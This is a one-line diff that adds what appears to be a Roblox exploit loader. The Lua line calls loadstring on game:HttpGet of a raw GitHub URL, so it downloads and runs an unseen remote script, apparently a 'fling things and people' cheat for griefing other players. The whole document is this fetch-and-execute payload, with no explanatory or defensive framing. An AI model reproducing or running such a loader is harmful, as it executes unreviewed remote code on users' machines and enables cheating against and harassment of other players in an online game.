@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/fling-things-and-people-spam6-0jir5mjfkp2h0y.lua"))()
